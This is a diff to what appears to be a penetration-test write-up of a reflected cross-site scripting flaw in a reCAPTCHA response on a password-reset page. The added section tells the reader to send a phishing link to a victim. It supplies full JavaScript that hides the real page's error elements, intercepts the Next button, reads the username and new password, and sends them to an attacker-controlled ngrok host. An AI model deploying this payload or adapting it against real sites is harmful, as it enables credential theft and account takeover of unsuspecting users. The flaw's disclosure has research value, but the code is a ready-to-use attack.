@@ -44,7 +44,49 @@ Create a page on your domain that you control with the following contents:
 
 Anything in the recaptcha response get's reflected. So you will send a phishing link to your victim to your website which will redirect the post request to the website, thus running javascript on the victims browser.
 
-I will leave it up to your imagination to do what you'd like with your payload. In my engagement, I wrote a proof of concept and created my own login form, while hiding the real one, courcing the user to login into it.
+I will leave it up to your imagination to do what you'd like with your payload. In my engagement, I wrote a proof of concept and created my own reset form, while hiding the real one, courcing the user to reset their password in it. You may improve it to do both the password reset and send the data to your server. I only sent the data to my server as proof of concept.
+
+As noted, use `<script this.src="">` to remotely load your javascript, there is a character limit in the reflection, so you must load it remotely.
+
+```js
+//First we will want to remove the Server error so the user doesn't get suspicious. Also, make sure to </div> before script. We can remote load our javascript with <script this.src=""> so we'll do that.
+
+<script>
+const serverErrorElement = document.getElementById('serverError');
+if (serverErrorElement) {
+  serverErrorElement.remove();
+}
+const onElements = document.querySelectorAll('.on');
+onElements.forEach((element) => {
+  element.remove();
+});
+const offElements = document.querySelectorAll('.off');
+offElements.forEach((element) => {
+  element.remove();
+});
+const arrowImage = document.querySelector('img[src="/PasswordReset/Content/Images/arrow.svg"]');
+if (arrowImage) {
+  arrowImage.remove();
+}
+
+const nextButton = document.querySelector('button[value="Next"]');
+
+// Add an event listener to the 'Next' button
+nextButton.addEventListener('click', async (event) => {
+  // Prevent the default button click behavior
+  event.preventDefault();
+
+// Get the values of the ConfirmPassword and Username fields
+  const confirmPassword = document.getElementById('ConfirmPassword').value;
+  const username = document.getElementById('Username').value;
+
+  // Create the URL with the ConfirmPassword and Username values as parameters
+  const url = `https://aaaaaa.ngrok.io/index.php?ConfirmPassword=${encodeURIComponent(confirmPassword)}&Username=${encodeURIComponent(username)}`;
+
+  // Redirect to the other site's endpoint
+  window.location.href = url;
+});</script>
+```
 
 ## Recaptcha Bypass
 
